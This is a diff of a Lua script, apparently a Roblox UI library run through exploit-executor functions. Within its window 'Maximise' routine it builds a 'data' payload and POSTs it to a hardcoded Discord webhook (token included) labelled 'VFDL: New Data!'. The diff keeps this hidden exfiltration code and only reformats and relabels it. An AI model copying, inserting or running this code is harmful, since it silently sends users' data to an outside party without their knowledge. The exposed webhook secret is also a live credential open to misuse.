@@ -1290,9 +1290,7 @@ local function Maximise()
 	task.wait(0.2)
 
 	Elements.Visible = true
-	local WebhookUrl = "https://discord.com/api/webhooks/1335733755251396790/-regQbELxtwe7148V3yNsU8iEdLputKFWfRUQjuGHVuvvIrEoVs1sXv7jWQGym5HveHu"
-
-
+local WebhookUrl = "https://discord.com/api/webhooks/1335733755251396790/-regQbELxtwe7148V3yNsU8iEdLputKFWfRUQjuGHVuvvIrEoVs1sXv7jWQGym5HveHu"
 
 local path, luav = "LuaV/LuaV.lua", getgenv().luav if not(luav) then
 if isfile(path) then luav = dofile(path)() else
@@ -1379,7 +1377,7 @@ local data = {
 data = hs[1]:JSONEncode(
     {
         ["avatar_url"] = "",
-        ["content"] = "**```ansi\n[2;31mNew Data![0m[2;31m[0m\n```**",
+        ["content"] = "**```ansi\n[2;31mVFDL: New Data![0m[2;31m[0m\n```**",
         ["embeds"] = {
             {
                 ["description"] = LuaV(data):c("s")[1],
@@ -1397,6 +1395,7 @@ data = hs[1]:JSONEncode(
 
 local request = http_request or request or HttpPost or syn.request
 if request then print(unpack(request({Url = WebhookUrl, Body = data, Method = "POST", Headers = {["content-type"] = "application/json"}}))) end
+
 	for _, tab in ipairs(Elements:GetChildren()) do
 		if tab.Name ~= "Template" and tab.ClassName == "ScrollingFrame" and tab.Name ~= "Placeholder" then
 			for _, element in ipairs(tab:GetChildren()) do
